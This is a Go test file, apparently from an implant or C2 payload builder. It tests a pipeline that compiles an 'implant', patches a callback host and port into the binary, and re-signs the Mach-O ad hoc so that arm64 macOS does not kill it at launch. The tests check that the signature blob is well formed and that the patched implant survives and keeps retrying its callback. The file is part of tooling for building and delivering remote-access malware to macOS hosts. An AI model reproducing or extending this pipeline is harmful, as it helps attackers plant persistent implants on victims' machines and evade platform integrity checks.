package payload

import (
	"context"
	"crypto/sha256"
	"encoding/binary"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"time"
)

// fakeMachO builds a minimal thin 64-bit image with __LINKEDIT and a
// LC_CODE_SIGNATURE pointing just past the load commands, which is all the
// signer inspects.
func fakeMachO() []byte {
	le := binary.LittleEndian
	const (
		hdr     = 32
		cmdsLen = 72 + 16 // __LINKEDIT segment + LC_CODE_SIGNATURE
		codeEnd = hdr + cmdsLen
	)
	b := make([]byte, codeEnd+64)
	le.PutUint32(b[0:], machMagic64)
	le.PutUint32(b[4:], 0x0100000C) // CPU_TYPE_ARM64
	le.PutUint32(b[16:], 2)         // ncmds
	le.PutUint32(b[20:], cmdsLen)

	seg := hdr
	le.PutUint32(b[seg:], lcSegment64)
	le.PutUint32(b[seg+4:], 72)
	copy(b[seg+8:seg+24], "__LINKEDIT")
	// __LINKEDIT starts before the signature: the signature is its tail, which
	// is what the signer expects (fileoff < codeLimit).
	le.PutUint64(b[seg+32:], 4096)               // vmsize
	le.PutUint64(b[seg+40:], uint64(codeEnd-20)) // fileoff
	le.PutUint64(b[seg+48:], 20)                 // filesize

	sig := hdr + 72
	le.PutUint32(b[sig:], lcCodeSignature)
	le.PutUint32(b[sig+4:], 16)
	le.PutUint32(b[sig+8:], uint32(codeEnd))
	le.PutUint32(b[sig+12:], 64)
	return b
}

func TestSignAdhocMachOStructure(t *testing.T) {
	in := fakeMachO()
	out, ok := signAdhocMachO(in, "payload")
	if !ok {
		t.Fatal("signer declined a well-formed image")
	}
	le, be := binary.LittleEndian, binary.BigEndian

	sig := 32 + 72
	codeLimit := int(le.Uint32(out[sig+8:]))
	blobLen := int(le.Uint32(out[sig+12:]))
	if len(out) != codeLimit+blobLen {
		t.Fatalf("len %d != codeLimit %d + blob %d", len(out), codeLimit, blobLen)
	}
	blob := out[codeLimit:]
	if be.Uint32(blob[0:]) != codeSigMagic || int(be.Uint32(blob[4:])) != blobLen || be.Uint32(blob[8:]) != 1 {
		t.Fatalf("bad superblob header: % x", blob[:20])
	}
	cd := blob[20:]
	if be.Uint32(cd[0:]) != codeDirMagic || be.Uint32(cd[8:]) != codeDirVersion {
		t.Fatalf("bad code directory: % x", cd[:16])
	}
	if be.Uint32(cd[12:]) != codeSigFlags {
		t.Fatalf("flags = %#x", be.Uint32(cd[12:]))
	}
	if be.Uint32(cd[32:]) != uint32(codeLimit) {
		t.Fatalf("codeLimit in CD = %d", be.Uint32(cd[32:]))
	}
	nSlots := int(be.Uint32(cd[28:]))
	if nSlots != (codeLimit+signPageSize-1)/signPageSize {
		t.Fatalf("nCodeSlots = %d", nSlots)
	}
	hashOff := int(be.Uint32(cd[16:]))
	if hashOff != codeDirFixedLen+len("payload")+1 {
		t.Fatalf("hashOffset = %d", hashOff)
	}
	// every page hash must match the (final) image contents
	for i := 0; i < nSlots; i++ {
		start := i * signPageSize
		end := start + signPageSize
		if end > codeLimit {
			end = codeLimit
		}
		want := sha256.Sum256(out[start:end])
		got := cd[hashOff+i*sha256.Size : hashOff+(i+1)*sha256.Size]
		if string(want[:]) != string(got) {
			t.Fatalf("page %d hash mismatch", i)
		}
	}
	// __LINKEDIT must cover the blob
	linkedit := 32
	if fs := int(le.Uint64(out[linkedit+48:])); fs < blobLen {
		t.Fatalf("__LINKEDIT filesize = %d, blob = %d", fs, blobLen)
	}
	if vs := int(le.Uint64(out[linkedit+32:])); vs%signPageSize != 0 || vs < int(le.Uint64(out[linkedit+48:])) {
		t.Fatalf("__LINKEDIT vmsize = %d", vs)
	}

	// a second pass over already-signed bytes must stay valid (idempotent
	// structure: the previous blob is replaced, not appended twice)
	out2, ok := signAdhocMachO(out, "payload")
	if !ok || len(out2) != len(out) {
		t.Fatalf("re-sign changed size: %d -> %d (ok=%v)", len(out), len(out2), ok)
	}
}

func TestSignAdhocRejectsForeignShapes(t *testing.T) {
	if _, ok := signAdhocMachO([]byte("not a mach-o at all"), "x"); ok {
		t.Fatal("accepted garbage")
	}
	fat := []byte{0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0}
	fat = append(fat, make([]byte, 48)...)
	if _, ok := signAdhocMachO(fat, "x"); ok {
		t.Fatal("accepted a fat binary; codesign fallback should handle it")
	}
	// 64-bit magic but truncated load commands
	short := make([]byte, 40)
	binary.LittleEndian.PutUint32(short[0:], machMagic64)
	binary.LittleEndian.PutUint32(short[16:], 4)
	if _, ok := signAdhocMachO(short, "x"); ok {
		t.Fatal("accepted a truncated image")
	}
}

// TestDarwinPayloadStarts is the regression test for the actual failure mode:
// after PatchBinary the old signature no longer matches, arm64 macOS SIGKILLs
// the process at exec, and the repaired payload must verify and run.
func TestDarwinPayloadStarts(t *testing.T) {
	if runtime.GOOS != "darwin" {
		t.Skip("only meaningful on a macOS host")
	}
	if testing.Short() {
		t.Skip("builds the implant")
	}
	root, err := moduleRoot()
	if err != nil {
		t.Fatal(err)
	}
	gb, err := exec.LookPath("go")
	if err != nil {
		t.Skip("go toolchain not installed")
	}
	dir := t.TempDir()
	raw := filepath.Join(dir, "raw")
	cmd := exec.Command(gb, "build", "-trimpath", "-ldflags", "-s -w -buildid=", "-o", raw, "./cmd/implant")
	cmd.Dir = root
	cmd.Env = append(os.Environ(), "GOOS=darwin", "GOARCH=arm64", "CGO_ENABLED=0")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("build: %v %s", err, out)
	}
	stub, err := os.ReadFile(raw)
	if err != nil {
		t.Fatal(err)
	}
	patched, err := PatchBinary(stub, "127.0.0.1", "9", 0x5A)
	if err != nil {
		t.Fatalf("patch: %v", err)
	}

	verify := func(b []byte) error {
		p := filepath.Join(dir, "check")
		if err := os.WriteFile(p, b, 0o700); err != nil {
			return err
		}
		return exec.Command("codesign", "--verify", "--strict", p).Run()
	}
	if _, err := exec.LookPath("codesign"); err == nil {
		if err := verify(patched); err == nil {
			t.Fatal("patched binary still verifies: the patch site is probably unused")
		}
	}

	signed, how, ok := signDarwin(patched, "payload")
	if !ok {
		t.Fatalf("signDarwin failed (%s)", how)
	}
	if err := verify(signed); err != nil {
		t.Fatalf("repaired payload does not verify: %v", err)
	}
	assertRuns(t, dir, signed)
}

// assertRuns starts the payload and fails if the kernel kills it outright. The
// implant keeps retrying its callback, so surviving the window is success.
func assertRuns(t *testing.T, dir string, b []byte) {
	t.Helper()
	path := filepath.Join(dir, "run")
	if err := os.WriteFile(path, b, 0o700); err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 700*time.Millisecond)
	defer cancel()
	cmd := exec.CommandContext(ctx, path)
	cmd.Dir = dir
	_ = cmd.Run()
	if ctx.Err() != context.DeadlineExceeded {
		ws, _ := cmd.ProcessState.Sys().(syscall.WaitStatus)
		t.Fatalf("payload died before the deadline (signal=%v code=%d) - signature rejected",
			ws.Signal(), cmd.ProcessState.ExitCode())
	}
}

// TestBuildDarwinPayloadIsSigned checks the pipeline wiring: Build() must run
// the patch stage and then repair the signature, and the produced bytes must
// still run. This is the path the 载荷生成 page uses for darwin targets.
func TestBuildDarwinPayloadIsSigned(t *testing.T) {
	if runtime.GOOS != "darwin" {
		t.Skip("payload signature only enforced by macOS")
	}
	if testing.Short() {
		t.Skip("builds the implant")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()
	res, err := Build(ctx, Request{Host: "127.0.0.1", Port: 9, Filename: "implant", Target: "darwin-arm64", Language: "go"})
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(res.Techniques, " ")
	if !strings.Contains(joined, "ad-hoc") {
		t.Fatalf("techniques missing the signing step: %v", res.Techniques)
	}
	assertRuns(t, t.TempDir(), res.Bytes)
}
